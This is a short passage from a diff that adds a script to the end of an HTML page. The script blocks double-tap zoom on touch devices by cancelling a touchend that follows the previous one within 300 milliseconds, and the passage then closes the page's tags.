+   ============================================================ */
+let lastTouchEnd = 0;
+document.addEventListener('touchend', (e) => {
+  const now = Date.now();
+  if (now - lastTouchEnd <= 300) {
+    e.preventDefault();
+  }
+  lastTouchEnd = now;
+}, { passive: false });
+</script>
+
+</body>
+</html>
